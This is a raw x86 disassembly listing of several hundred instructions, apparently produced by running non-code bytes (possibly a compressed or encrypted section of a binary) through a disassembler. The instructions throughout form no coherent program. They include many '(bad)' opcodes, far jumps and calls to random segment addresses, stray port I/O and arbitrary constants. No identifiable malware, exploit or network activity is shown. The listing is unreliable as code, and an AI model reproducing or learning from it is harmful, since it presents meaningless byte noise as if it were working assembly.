  41c134:	and    dh,BYTE PTR [edi+0x55]
  41c137:	sahf   
  41c138:	dec    edx
  41c139:	adc    DWORD PTR [ebx],eax
  41c13b:	sub    ebx,edx
  41c13d:	(bad)  
  41c13e:	mov    ah,0x96
  41c140:	pop    ss
  41c141:	in     eax,dx
  41c142:	shr    BYTE PTR [esi-0x5b],cl
  41c145:	push   ds
  41c146:	sub    eax,0x36d9de59
  41c14b:	mov    DWORD PTR [ebx],ebx
  41c14d:	int    0xba
  41c14f:	call   0xec4b:0x4b418807
  41c156:	push   es
  41c157:	lds    edi,FWORD PTR [esi+0x4846b78c]
  41c15d:	fld    TBYTE PTR [edi]
  41c15f:	push   es
  41c160:	sbb    esp,DWORD PTR fs:[ebp+0x17]
  41c164:	lahf   
  41c165:	mov    esi,0x8797de2d
  41c16a:	jmp    0xdbbb729c
  41c16f:	scas   al,BYTE PTR es:[edi]
  41c170:	outs   dx,DWORD PTR ds:[esi]
  41c171:	ss inc ebp
  41c173:	inc    ebp
  41c174:	mov    dh,0x21
  41c176:	xchg   edx,eax
  41c177:	or     BYTE PTR [esi+esi*1-0x30],bl
  41c17b:	or     eax,0x69a85081
  41c180:	into   
  41c181:	pop    eax
  41c182:	pop    ds
  41c183:	ficomp DWORD PTR [ecx-0x42d5809d]
  41c189:	scas   eax,DWORD PTR es:[edi]
  41c18a:	les    esi,FWORD PTR [edx+0x67]
  41c18d:	mov    ch,0x1a
  41c18f:	pop    esp
  41c190:	das    
  41c191:	mov    ah,0x63
  41c193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c194:	inc    eax
  41c195:	adc    DWORD PTR [ebp-0xac2ed37],ebx
  41c19b:	shl    DWORD PTR [edx-0x68904387],1
  41c1a1:	or     ch,dl
  41c1a3:	rcr    DWORD PTR [eax-0x609c3362],1
  41c1a9:	inc    ebx
  41c1aa:	adc    al,0x31
  41c1ac:	jg     0x41c17a
  41c1ae:	(bad)  
  41c1b0:	pop    esi
  41c1b1:	popa   
  41c1b2:	and    DWORD PTR [ebx*2+0x292dd3e1],edi
  41c1b9:	int    0x55
  41c1bb:	repz pop ds
  41c1bd:	sub    DWORD PTR [edi],0xfffffff1
  41c1c0:	xchg   edi,eax
  41c1c1:	jne    0x41c143
  41c1c3:	les    ecx,FWORD PTR [eax+0x2270e231]
  41c1c9:	gs hlt 
  41c1cb:	nop
  41c1cc:	lea    esp,[edi+0x3afb5314]
  41c1d2:	push   edx
  41c1d3:	pop    ds
  41c1d4:	mov    ebp,0xeae6de53
  41c1d9:	xor    BYTE PTR [edx-0x42],ch
  41c1dc:	data16 sahf 
  41c1de:	inc    ecx
  41c1df:	add    BYTE PTR [esi+eiz*2],cl
  41c1e2:	and    DWORD PTR [ecx-0x41],edx
  41c1e5:	fst    QWORD PTR [ecx]
  41c1e7:	push   DWORD PTR [eax+0x45f7ebad]
  41c1ed:	or     DWORD PTR [ebx],edx
  41c1ef:	mov    al,ds:0xe617184a
  41c1f4:	add    BYTE PTR [edx-0x78],ah
  41c1f7:	(bad)  
  41c1f8:	stc    
  41c1f9:	repnz les edi,FWORD PTR [edi]
  41c1fc:	push   edi
  41c1fd:	xchg   edx,eax
  41c1fe:	mov    WORD PTR [eax-0x3a2b5cd2],gs
  41c204:	push   es
  41c205:	jnp    0x41c1c8
  41c207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c208:	mov    ds:0x20d05684,eax
  41c20d:	scas   eax,DWORD PTR es:[edi]
  41c20e:	mov    esp,0xe084d3af
  41c213:	xor    dh,BYTE PTR [edx-0x15]
  41c216:	or     dh,bh
  41c218:	ins    DWORD PTR es:[edi],dx
  41c219:	bnd jmp 0x41c1eb
  41c21c:	stos   BYTE PTR es:[edi],al
  41c21d:	mov    BYTE PTR [ebx+edx*1],0x94
  41c221:	mov    ah,0x24
  41c223:	int    0xe1
  41c225:	fdivr  QWORD PTR [edi-0x63ee5f33]
  41c22b:	sbb    dh,BYTE PTR [ecx-0x32686dd7]
  41c231:	out    dx,eax
  41c232:	add    BYTE PTR [eax+0x14],0xb4
  41c236:	xchg   esi,ecx
  41c238:	fs push cs
  41c23a:	or     BYTE PTR [ecx],bh
  41c23c:	or     DWORD PTR [esi+0x65c3feb5],0x874a3ecd
  41c246:	pop    esi
  41c247:	push   es
  41c248:	jnp    0x41c22d
  41c24a:	nop    DWORD PTR [edi]
  41c24d:	icebp  
  41c24e:	ror    esi,1
  41c250:	cmp    bl,bl
  41c252:	xchg   DWORD PTR [ebx+edx*1],eax
  41c255:	xor    cl,BYTE PTR [edi-0x55d80ebd]
  41c25b:	lock jl 0x66cdafa
  41c262:	js     0x41c1f4
  41c264:	push   ds
  41c265:	int3   
  41c266:	shr    DWORD PTR [esi],1
  41c268:	jno    0x41c258
  41c26a:	test   eax,0xbe97605a
  41c26f:	xor    edx,DWORD PTR [ecx]
  41c271:	or     ecx,DWORD PTR [ecx-0x7b02f818]
  41c277:	data16 mov gs,WORD PTR ds:0xf7f9ef8a
  41c27e:	adc    DWORD PTR [esp+eiz*4+0x770bf452],esp
  41c285:	lock or edi,0x15
  41c289:	jo     0x41c297
  41c28b:	pop    eax
  41c28c:	cs dec edi
  41c28e:	push   0x7
  41c290:	lds    edi,FWORD PTR [ebx-0x18d895bb]
  41c296:	ffreep st(0)
  41c298:	(bad)  
  41c299:	sbb    ecx,DWORD PTR [ebp-0x56ea4ce6]
  41c29f:	sbb    eax,0x13f600d6
  41c2a4:	adc    edi,DWORD PTR [edi-0x1e5bd0e9]
  41c2aa:	outs   dx,DWORD PTR ds:[esi]
  41c2ab:	out    dx,al
  41c2ac:	inc    esp
  41c2ad:	jmp    0x41c305
  41c2af:	call   0xd503:0x89dbbbd5
  41c2b6:	xor    cl,ch
  41c2b8:	(bad)
  41c2bb:	ret    
  41c2bc:	xchg   edi,eax
  41c2bd:	add    ch,al
  41c2bf:	mov    ds:0x4d6a59f,eax
  41c2c4:	enter  0x36f3,0x8e
  41c2c8:	bound  edi,QWORD PTR [ebx-0xb88e3b2]
  41c2ce:	dec    esi
  41c2cf:	sbb    esp,DWORD PTR [edi+0x44]
  41c2d2:	xor    dh,bl
  41c2d4:	neg    ebx
  41c2d6:	scas   eax,DWORD PTR es:[edi]
  41c2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d8:	je     0x41c2d3
  41c2da:	add    eax,0x1b88696f
  41c2df:	ss jmp 0xef0b:0xb0af8089
  41c2e7:	push   0xfffffff6
  41c2e9:	scas   al,BYTE PTR es:[edi]
  41c2ea:	jb     0x41c2fc
  41c2ec:	mov    eax,0x7ec7a23d
  41c2f1:	cwde   
  41c2f2:	push   edx
  41c2f3:	xchg   ecx,eax
  41c2f4:	jle    0x41c29b
  41c2f6:	dec    ecx
  41c2f7:	cwde   
  41c2f8:	or     ebx,edi
  41c2fa:	lods   eax,DWORD PTR ds:[esi]
  41c2fb:	adc    eax,0xfa1e6f61
  41c300:	sbb    DWORD PTR [edx+0x6e],0x4aa8e637
  41c307:	xchg   ebx,eax
  41c308:	push   ebp
  41c309:	jg     0x41c326
  41c30b:	inc    edx
  41c30c:	loop   0x41c388
  41c30e:	fld    TBYTE PTR [ebx-0x60147931]
  41c314:	cmc    
  41c315:	inc    ecx
  41c316:	(bad)  
  41c318:	pop    esi
  41c319:	out    dx,al
  41c31a:	scas   eax,DWORD PTR es:[edi]
  41c31b:	pop    esi
  41c31c:	cdq    
  41c31d:	lahf   
  41c31e:	inc    ebx
  41c31f:	cwde   
  41c320:	ja     0x41c2fc
  41c322:	(bad)  
  41c323:	lods   al,BYTE PTR ds:[esi]
  41c324:	outs   dx,DWORD PTR ds:[esi]
  41c325:	xchg   ebx,eax
  41c326:	repz add bl,BYTE PTR [edx]
  41c329:	sti    
  41c32a:	data16 mov bl,0x4b
  41c32d:	jl     0x41c357
  41c32f:	inc    ecx
  41c330:	out    0x5e,eax
  41c332:	(bad)  
  41c334:	and    ch,al
  41c336:	test   eax,0x3a8a48ae
  41c33b:	xor    eax,0xffb3c79
  41c340:	or     ch,BYTE PTR [edx-0x46]
  41c343:	mov    ah,0xe6
  41c345:	jae    0x1cc6ad4b
  41c34b:	imul   eax,ecx,0x1f
  41c34e:	scas   al,BYTE PTR es:[edi]
  41c34f:	arpl   WORD PTR [edi+eax*1-0x7],bx
  41c353:	mov    esi,0x88368328
  41c358:	bound  ecx,QWORD PTR [ebp-0x711ce6d1]
  41c35e:	sub    al,0xb4
  41c360:	xor    DWORD PTR [ebx-0x264773a4],esi
  41c366:	adc    BYTE PTR [esi-0x52],al
  41c369:	xchg   DWORD PTR [ecx+ecx*8-0x239a95cb],ebp
  41c370:	inc    edx
  41c371:	push   eax
  41c372:	jbe    0x41c376
  41c374:	inc    edi
  41c375:	inc    esp
  41c376:	addr16 jns 0x41c38a
  41c379:	fmul   DWORD PTR [ebx+0x13]
  41c37c:	ss mov cl,0x91
  41c37f:	mov    dl,0x61
  41c381:	add    ah,0xd3
  41c384:	not    DWORD PTR [esi-0x442a1f68]
  41c38a:	or     ch,ah
  41c38c:	adc    al,0xb3
  41c38e:	push   cs
  41c38f:	pop    DWORD PTR [ebp+0x50779917]
  41c395:	arpl   WORD PTR [edx-0x76e1d01e],si
  41c39b:	(bad)  
  41c39c:	call   DWORD PTR [esi]
  41c39e:	mov    ecx,0xc78bf43e
  41c3a3:	dec    ecx
  41c3a4:	test   al,0x49
  41c3a6:	jg     0x41c3b9
  41c3a8:	add    BYTE PTR [ebx+0x59],dl
  41c3ab:	cmp    BYTE PTR [eax],0xd7
  41c3ae:	cmc    
  41c3af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3b0:	jae    0x41c339
  41c3b2:	sub    BYTE PTR [esi],ah
  41c3b4:	sahf   
  41c3b5:	dec    ecx
  41c3b6:	into   
  41c3b7:	pop    edx
  41c3b8:	cmp    DWORD PTR [esi-0x2f],0xfffffffc
  41c3bc:	jp     0x41c376
  41c3be:	dec    ebp
  41c3bf:	in     eax,0xfb
  41c3c1:	and    al,0x74
  41c3c3:	mov    al,BYTE PTR [edi+eiz*8]
  41c3c6:	fcom   QWORD PTR [ebx+0x136b6730]
  41c3cc:	popa   
  41c3cd:	sub    ah,cl
  41c3cf:	jp     0x41c38e
  41c3d1:	pop    esi
  41c3d2:	inc    esp
  41c3d3:	and    cl,BYTE PTR [esi+0x7]
  41c3d6:	repz stc 
  41c3d8:	int3   
  41c3d9:	cmp    ah,BYTE PTR [esi]
  41c3db:	fdivrp st(6),st
  41c3dd:	outs   dx,BYTE PTR ds:[esi]
  41c3de:	mov    dl,0xf4
  41c3e0:	lahf   
  41c3e1:	mov    ds:0x92c3ce28,al
  41c3e6:	mov    bl,0xf5
  41c3e8:	sti    
  41c3e9:	or     al,0x5
  41c3eb:	sbb    cl,BYTE PTR [eax-0x56]
  41c3ee:	add    eax,0x3071082b
  41c3f3:	lock xlat BYTE PTR ds:[ebx]
  41c3f5:	shl    DWORD PTR [edi+0x558b2080],0x9c
  41c3fc:	scas   eax,DWORD PTR es:[edi]
  41c3fd:	pop    es
  41c3fe:	adc    eax,0x6aca2b06
  41c403:	enter  0x7e8a,0xfb
  41c407:	sub    ebx,DWORD PTR [eax-0x2b]
  41c40a:	xor    bh,0xd4
  41c40d:	or     al,0x6c
  41c40f:	leave  
  41c410:	inc    ecx
  41c411:	stos   BYTE PTR es:[edi],al
  41c412:	je     0x41c415
  41c414:	dec    dx
  41c416:	inc    esp
  41c417:	mov    ecx,DWORD PTR [edx]
  41c419:	push   edi
  41c41a:	pop    edi
  41c41b:	ficomp WORD PTR [esi]
  41c41d:	mov    edx,0x629a07af
  41c422:	jge    0x41c3f6
  41c424:	fwait
  41c425:	xor    DWORD PTR [eax+0x6bef88d4],edi
  41c42b:	aam    0x85
  41c42d:	jmp    0x9be473fd
  41c432:	retf   0xb0a4
  41c435:	sti    
  41c436:	stos   DWORD PTR es:[edi],eax
  41c437:	outs   dx,BYTE PTR ds:[esi]
  41c438:	push   ds
  41c439:	mov    DWORD PTR [ecx+0x2f0b5a6e],edx
  41c43f:	test   BYTE PTR [edx-0x6503c53e],bh
  41c445:	adc    ecx,ecx
  41c447:	push   0x28
  41c449:	shr    BYTE PTR [edx+ebp*2-0x2231db77],0x7d
  41c451:	push   ss
  41c452:	lds    ecx,FWORD PTR [ecx+0x34]
  41c455:	into   
  41c456:	and    edi,DWORD PTR [ebp+0x418de6c6]
  41c45c:	jae    0x41c3ea
  41c45e:	dec    ebp
  41c45f:	(bad)  
  41c460:	cmp    al,0x2c
  41c462:	inc    ebp
  41c463:	mov    edx,0xd24feae
  41c468:	adc    al,0x12
  41c46a:	xchg   DWORD PTR [edi-0x409508b0],esi
  41c470:	push   esi
  41c471:	and    al,0xbd
  41c473:	xchg   esi,eax
  41c474:	pop    edi
  41c475:	push   cs
  41c476:	jne    0x41c46a
  41c478:	(bad)  
  41c479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c47a:	je     0x41c409
  41c47c:	jb     0x41c4df
  41c47e:	sub    ch,BYTE PTR [ecx+0x599e05f8]
  41c484:	or     DWORD PTR [esi+0x0],edi
  41c487:	out    0xc2,eax
  41c489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c48a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c48b:	add    ebx,DWORD PTR [ecx-0x6b]
  41c48e:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c490:	cwde   
  41c491:	jnp    0x41c4ee
  41c493:	sub    BYTE PTR [ecx-0x4fccdb75],0x93
  41c49a:	addr16 dec esp
  41c49c:	pop    edx
  41c49d:	ret    0xac95
  41c4a0:	enter  0xdf67,0x56
  41c4a4:	scas   al,BYTE PTR es:[edi]
  41c4a5:	(bad)  
  41c4a6:	mov    dl,0xf
  41c4a8:	cdq    
  41c4a9:	push   cs
  41c4aa:	sub    ch,dl
  41c4ac:	ins    BYTE PTR es:[edi],dx
  41c4ad:	or     dh,BYTE PTR [ebx-0x6f726753]
  41c4b3:	and    al,0xb0
  41c4b5:	mov    eax,ds:0xe8e436ed
  41c4ba:	ficomp DWORD PTR [edx-0x11]
  41c4bd:	xchg   edx,eax
  41c4be:	test   eax,0x579292b8
  41c4c3:	mov    eax,0x29b24a6d
  41c4c8:	jmp    0x145a:0x36397f20
  41c4cf:	cli    
  41c4d0:	add    DWORD PTR [eax+0x6b],ebp
  41c4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4d4:	inc    ebx
  41c4d5:	mov    ecx,0x73e3ab3b
  41c4da:	cld    
  41c4db:	jl     0x41c509
  41c4dd:	pop    es
  41c4de:	and    edx,DWORD PTR [edi]
  41c4e0:	dec    ecx
  41c4e1:	sub    al,0xb7
  41c4e3:	in     eax,0xb7
  41c4e5:	mov    al,0x7b
  41c4e7:	xchg   esp,eax
  41c4e8:	add    BYTE PTR [eax+0x51],dl
  41c4eb:	popa   
  41c4ec:	mov    ch,0x7c
  41c4ee:	add    DWORD PTR ds:0x73eeb940,0x6ce6a6f2
  41c4f8:	jo     0x41c517
  41c4fa:	stos   BYTE PTR es:[edi],al
  41c4fb:	xchg   ebp,eax
  41c4fc:	mov    al,ds:0x79ebd1ca
  41c501:	jmp    0x41c53a
  41c503:	add    esi,DWORD PTR [ecx+0x33b071a4]
  41c509:	mov    esi,0x627e60e3
  41c50e:	pop    ecx
  41c50f:	call   0x8cfdc2d3
  41c514:	and    edx,DWORD PTR [ecx-0x575aaef9]
  41c51a:	hlt    
  41c51b:	pop    ebx
  41c51c:	mov    ebx,0x538a8b56
  41c521:	sti    
  41c522:	js     0x41c4eb
  41c524:	and    dl,BYTE PTR [edx+0x32]
  41c527:	or     DWORD PTR [ebx],ebx
  41c529:	mov    ecx,DWORD PTR [ebx]
  41c52b:	xchg   ebx,eax
  41c52c:	stc    
  41c52d:	ds adc cl,0xc6
  41c531:	leave  
  41c532:	aam    0xf9
  41c534:	repnz stc 
  41c536:	out    0x4c,eax
  41c538:	xchg   BYTE PTR [ebp-0x39],al
  41c53b:	sbb    eax,0x779a99b3
  41c540:	push   ebp
  41c541:	lea    eax,[ecx+0x4b6f5886]
  41c547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c548:	and    eax,0x75209f19
  41c54d:	pusha  
  41c54e:	cld    
  41c54f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c550:	xor    dl,dh
  41c552:	(bad)  
  41c553:	ror    edi,1
  41c555:	adc    DWORD PTR [edi],esi
  41c557:	dec    edx
  41c558:	ds jmp 0x41c5be
  41c55b:	xor    ch,BYTE PTR [esi]
  41c55d:	out    dx,al
  41c55e:	lahf   
  41c55f:	ss xor al,0xa4
  41c562:	jmp    0xd083f2cf
  41c567:	add    DWORD PTR [edi+edx*1+0x24],ebx
  41c56b:	pop    ss
  41c56c:	das    
  41c56d:	jae    0x41c57b
  41c56f:	xor    esi,DWORD PTR [edx-0x22a52bec]
  41c575:	mov    dl,0x79
  41c577:	and    al,0x46
  41c579:	xchg   ebx,eax
  41c57a:	jo     0x41c5f1
  41c57c:	jge    0x41c5ee
  41c57e:	adc    edx,DWORD PTR [eax]
  41c580:	xchg   ecx,eax
  41c581:	cmp    dh,BYTE PTR [ebx+ebx*8+0x4]
  41c585:	fs push ds
  41c587:	mov    ecx,0x756a1c4d
  41c58c:	mov    DWORD PTR [edi+edx*1+0x5f],esi
  41c590:	mov    esi,0x68e809d2
  41c595:	sbb    eax,0xc9acb3e7
  41c59a:	pushf  
  41c59b:	test   eax,esp
  41c59d:	push   eax
  41c59e:	cmp    DWORD PTR [eax+0x66],ecx
  41c5a1:	sub    BYTE PTR ds:0x66a608c2,dl
  41c5a7:	enter  0xaac7,0x3c
  41c5ab:	pop    edx
  41c5ac:	ins    BYTE PTR es:[edi],dx
  41c5ad:	test   DWORD PTR [ebp+0x701688da],0xacf438
  41c5b7:	xchg   ecx,eax
  41c5b8:	retf   
  41c5b9:	test   al,0x7c
  41c5bb:	push   ebp
  41c5bc:	cs dec eax
  41c5be:	ret    0xd967
  41c5c1:	bswap  ecx
  41c5c3:	outs   dx,DWORD PTR ds:[esi]
  41c5c4:	push   ss
  41c5c5:	pop    es
  41c5c6:	call   0x7a22:0x529cb599
  41c5cd:	pusha  
  41c5ce:	jp     0x41c590
  41c5d0:	jmp    0x41c5f5
  41c5d2:	dec    esi
  41c5d3:	in     eax,0xed
  41c5d5:	push   0x29
  41c5d7:	pop    es
  41c5d8:	push   0x62
  41c5da:	lea    eax,[eax-0x21b64583]
  41c5e0:	xor    DWORD PTR [ebx-0x7595d05c],edx
  41c5e6:	int3   
  41c5e7:	shl    DWORD PTR [ebx-0x61],0x71
  41c5eb:	add    eax,0xe11913e7
  41c5f0:	push   edx
  41c5f1:	adc    al,0x4a
  41c5f3:	jne    0x41c599
  41c5f5:	mov    al,ds:0x947efec8
  41c5fa:	add    eax,0x971c4762
  41c5ff:	push   ecx
  41c600:	loopne 0x41c5bc
  41c602:	jmp    0xa394e41c
  41c607:	lea    edi,ds:[esi]
  41c60a:	sbb    al,0x3a
  41c60c:	xchg   ebp,eax
  41c60d:	cmp    bh,BYTE PTR [ecx-0x67]
  41c610:	mov    ch,BYTE PTR [eax+0x734fdd35]
  41c616:	cdq    
  41c617:	mov    esp,0xf842fb8c
  41c61c:	pop    esp
  41c61d:	lds    esp,FWORD PTR [eax]
  41c61f:	jle    0x41c5f5
  41c621:	dec    esp
  41c622:	hlt    
  41c623:	mov    edx,0x7c28c216
  41c628:	mov    cl,0xf1
  41c62a:	les    ecx,FWORD PTR [esi+edi*2+0x82e6a65]
  41c631:	and    esi,DWORD PTR [ebx-0x47ab7439]
  41c637:	mov    al,0x18
  41c639:	pop    ebx
  41c63b:	dec    ebx
  41c63c:	adc    al,0x9d
  41c63e:	mov    cl,0xb8
  41c640:	je     0x41c621
  41c642:	sbb    bl,BYTE PTR [bx]
  41c645:	ja     0x41c6bc
  41c647:	retf   
  41c648:	mov    esi,0x5c03c079
  41c64d:	je     0x41c6b6
  41c64f:	enter  0x96e0,0x5b
  41c653:	out    0x23,eax
  41c655:	inc    ecx
  41c656:	jmp    DWORD PTR [eax]
  41c658:	pop    ds
  41c659:	fs ret 0x6f0c
  41c65d:	out    dx,eax
  41c65e:	cmp    eax,0xe520fc57
  41c663:	xor    eax,0x78fd531c
  41c668:	loope  0x41c68b
  41c66a:	sub    eax,0xa8dbd399
  41c66f:	pop    eax
  41c670:	loope  0x41c658
  41c672:	in     al,dx
  41c673:	sbb    al,0x61
  41c675:	and    eax,0xcaa4dade
  41c67a:	sti    
  41c67b:	shr    DWORD PTR [ebp+0x1b8f5277],0x6
  41c682:	mov    ch,0xf3
  41c684:	mov    eax,0x5246bc66
  41c689:	js     0x41c693
  41c68b:	jae    0x41c708
  41c68d:	pop    ecx
  41c68e:	pop    ebx
  41c68f:	pop    esi
  41c690:	rol    DWORD PTR ds:0x9c1e4de8,1
  41c696:	loopne 0x41c6f3
  41c698:	and    eax,0x7c7979df
  41c69d:	ins    DWORD PTR es:[edi],dx
  41c69e:	ds push cs
  41c6a0:	dec    edx
  41c6a1:	nop
  41c6a2:	adc    dh,BYTE PTR [edi-0xcb98af8]
  41c6a8:	sub    esi,ebx
  41c6aa:	xchg   ebp,eax
  41c6ab:	cs mov al,0xf2
  41c6ae:	mov    al,ds:0x59fbfac9
  41c6b3:	sar    BYTE PTR [esi-0x2e61c37c],0xdd
  41c6ba:	sub    eax,0x70b422cc
  41c6bf:	mov    dl,0x60
  41c6c1:	scas   eax,DWORD PTR es:[edi]
  41c6c2:	pop    es
  41c6c3:	jo     0x41c6ba
  41c6c5:	push   es
  41c6c6:	push   0x5a
  41c6c8:	adc    al,0x3d
  41c6ca:	cmp    bh,ah
  41c6cc:	and    dl,bh
  41c6ce:	add    al,0xa6
  41c6d0:	and    al,0x9b
  41c6d2:	cdq    
  41c6d3:	ins    BYTE PTR es:[edi],dx
  41c6d4:	(bad)  
  41c6d5:	(bad)  
  41c6d7:	add    esp,DWORD PTR [ebp-0x56]
  41c6da:	mov    ecx,0xf00e583d
  41c6df:	stos   BYTE PTR es:[edi],al
  41c6e0:	xor    al,ah
  41c6e2:	shl    BYTE PTR [ecx+0x2ffae8e5],cl
  41c6e8:	cwde   
  41c6e9:	inc    ebp
  41c6ea:	jmp    0x6a83b4c6
  41c6ef:	push   esp
  41c6f0:	or     al,0x73
  41c6f2:	cmc    
  41c6f3:	nop
  41c6f4:	stos   DWORD PTR es:[edi],eax
  41c6f5:	hlt    
  41c6f6:	ror    BYTE PTR [bp+di+0x40bd],0xb5
  41c6fc:	or     eax,0x6efc79cd
  41c701:	dec    edi
  41c702:	xor    DWORD PTR [esi],ebp
  41c704:	sub    eax,0x3ffecfb9
  41c709:	out    0x2,al
  41c70b:	pop    ds
  41c70c:	jnp    0x41c751
  41c70e:	es jl  0x41c754
  41c711:	in     eax,0x2c
  41c713:	jle    0x41c791
  41c715:	sbb    bl,0x4c
  41c718:	pop    esp
  41c719:	sbb    BYTE PTR [esi-0x398c0507],ch
  41c71f:	xchg   ecx,eax
  41c720:	xlat   BYTE PTR ds:[ebx]
  41c721:	and    al,0xd
  41c723:	aas    
  41c724:	xor    BYTE PTR [edi+eax*1],0x68
  41c728:	addr16 jge 0x41c6bf
  41c72b:	sub    esi,DWORD PTR [ebp-0x6a7bcbf9]
  41c731:	xor    BYTE PTR [bx+si],ch
  41c734:	inc    ebx
  41c735:	add    ah,BYTE PTR [ebx]
  41c737:	cmp    edi,DWORD PTR [edx]
  41c739:	pop    edi
  41c73a:	sub    dl,BYTE PTR [esi+0x58]
  41c73d:	ror    DWORD PTR [ecx],cl
  41c73f:	js     0x41c796
  41c741:	lock dec esp
  41c743:	in     eax,0x38
  41c745:	jno    0x41c702
  41c747:	add    esi,edx
  41c749:	pop    ebx
  41c74a:	shl    BYTE PTR ds:0x5c17bfb4,1
  41c750:	test   eax,0x7c6008a4
  41c755:	in     eax,dx
  41c756:	out    dx,eax
  41c757:	into   
  41c758:	cmp    cl,BYTE PTR [eax]
  41c75a:	or     eax,0xc272bea7
  41c75f:	ins    DWORD PTR es:[edi],dx
  41c760:	mov    ecx,0xdee06c09
  41c765:	cmc    
  41c766:	add    DWORD PTR [ebx],esp
  41c768:	mov    ebp,0xb236a90a
  41c76d:	mov    eax,ecx
  41c76f:	std    
  41c770:	shl    DWORD PTR [edi+0x70],cl
  41c773:	or     edi,0x4b
  41c776:	jecxz  0x41c701
  41c778:	sbb    al,0xf4
  41c77a:	outs   dx,BYTE PTR ds:[esi]
  41c77b:	popa   
  41c77c:	sbb    ebp,edi
  41c77e:	sbb    ch,BYTE PTR [esi+ebp*1]
  41c781:	dec    esp
  41c782:	xchg   edx,eax
  41c783:	fistp  QWORD PTR [ecx+0x3b]
  41c786:	jmp    0x41c765
  41c788:	enter  0x6db9,0x2a
  41c78c:	in     al,dx
  41c78d:	mov    WORD PTR [ebx-0x2],cs
  41c790:	mov    WORD PTR [ecx-0x6d],gs
  41c793:	and    eax,0x41bb508c
  41c798:	jae    0x41c79e
  41c79a:	call   0x6d09:0xcf4ead85
  41c7a1:	mov    esi,0xca6b796c
  41c7a6:	(bad)  
  41c7a8:	or     DWORD PTR [esi-0x5d64ad07],ebx
  41c7ae:	and    al,dh
  41c7b0:	lods   eax,DWORD PTR ds:[esi]
  41c7b1:	add    BYTE PTR [ebp+0x1d1d3305],bh
  41c7b7:	cmp    edi,DWORD PTR [edi]
  41c7b9:	in     eax,0x25
  41c7bb:	jb     0x41c7bc
  41c7bd:	sbb    DWORD PTR [edi],ebp
  41c7bf:	loop   0x41c819
  41c7c1:	or     eax,0xab80c28d
  41c7c6:	jbe    0x41c835
  41c7c8:	lds    esi,FWORD PTR [ecx]
  41c7ca:	aas    
  41c7cb:	sub    bh,dh
  41c7cd:	bound  eax,QWORD PTR [eax-0x1a242107]
  41c7d3:	mov    bh,0x48
  41c7d5:	push   cs
  41c7d6:	jmp    0x41c7f8
  41c7d8:	or     DWORD PTR [esi+0x4b],esi
  41c7db:	jmp    0x9d83:0x21641b87
  41c7e2:	bnd jp 0x41c818
  41c7e5:	cmp    al,0x26
  41c7e7:	dec    edi
  41c7e8:	into   
  41c7e9:	fdiv   DWORD PTR [ebx+eiz*4]
  41c7ec:	pop    esi
  41c7ed:	jmp    0x75eb:0x9498e2c4
  41c7f4:	jge    0x41c84e
  41c7f6:	dec    edi
  41c7f7:	outs   dx,DWORD PTR ds:[esi]
  41c7f8:	idiv   DWORD PTR [edx+0x68]
  41c7fb:	loopne 0x41c7cb
  41c7fd:	fild   WORD PTR [ecx+edi*1]
  41c800:	(bad)  
  41c801:	jnp    0x41c846
  41c803:	mov    ecx,0x4ba18e26
  41c808:	cmp    dh,ch
  41c80a:	push   0x2c7fcfa5
  41c80f:	push   0xe40b371c
  41c814:	mov    dl,0x2b
  41c816:	jge    0x41c847
  41c818:	xchg   ecx,eax
  41c819:	(bad)  
  41c81a:	jge    0x41c7cd
  41c81c:	inc    ebp
  41c81d:	cmp    ch,BYTE PTR [bx+si]
  41c820:	xchg   dh,dl
  41c822:	ror    BYTE PTR [ebp-0x75],0x84
  41c826:	leave  
  41c827:	in     eax,0x7f
  41c829:	popa   
  41c82a:	dec    esi
  41c82b:	add    DWORD PTR [edi-0x5c],ecx
  41c82e:	or     al,BYTE PTR [ebx-0x8]
  41c831:	push   0xa77aa50
  41c836:	pop    ss
  41c837:	and    ebx,DWORD PTR [ecx]
  41c839:	out    dx,al
  41c83a:	pop    es
  41c83b:	push   esi
  41c83c:	getsec 
  41c83e:	outs   dx,BYTE PTR ds:[esi]
  41c83f:	fiadd  WORD PTR [eax+esi*4]
  41c842:	(bad)  
  41c843:	push   ss
  41c844:	xor    DWORD PTR [edi],edi
  41c846:	push   0xe0dda7da
  41c84b:	push   ecx
  41c84c:	sub    DWORD PTR [edi],ebp
  41c84e:	loopne 0x41c897
  41c850:	mov    esi,0xa8222aaf
  41c855:	mov    ch,0x64
  41c857:	cdq    
  41c858:	sub    al,0xf7
  41c85a:	scas   eax,DWORD PTR es:[edi]
  41c85b:	dec    ebx
  41c85c:	neg    BYTE PTR [edx]
  41c85e:	add    BYTE PTR [edi-0x471410a2],0x37
  41c865:	hlt    
  41c866:	fsubr  DWORD PTR [ebp-0x35]
  41c869:	xchg   edi,eax
  41c86a:	int3   
  41c86b:	popf   
  41c86c:	retf   
  41c86d:	cmp    edi,DWORD PTR [ebp-0x17949e15]
  41c873:	push   esp
  41c874:	shl    bl,cl
  41c876:	data16 jp 0x41c8ec
  41c879:	aad    0x32
  41c87b:	cli    
  41c87c:	loope  0x41c80a
  41c87e:	add    edx,DWORD PTR cs:[ebx]
  41c881:	(bad)  
  41c882:	jl     0x41c833
  41c884:	mov    al,0xa0
  41c886:	shr    DWORD PTR [ebp+0x73],1
  41c889:	pop    ebp
  41c88a:	sub    ecx,DWORD PTR [edi]
  41c88c:	jbe    0x41c8e9
  41c88e:	stos   BYTE PTR es:[edi],al
  41c88f:	ins    BYTE PTR es:[edi],dx
  41c890:	jnp    0x41c910
  41c892:	pop    ds
  41c893:	mov    dh,0x5e
  41c895:	aam    0x2f
  41c897:	loope  0x41c8cd
  41c899:	pusha  
  41c89a:	pop    ebp
  41c89b:	pop    edx
  41c89c:	xor    BYTE PTR [esi-0x65],cl
  41c89f:	out    dx,al
  41c8a0:	push   eax
  41c8a1:	test   DWORD PTR [edi+0xc264427],0x46b6d022
  41c8ab:	push   edi
  41c8ac:	ret    
  41c8ad:	xlat   BYTE PTR ds:[ebx]
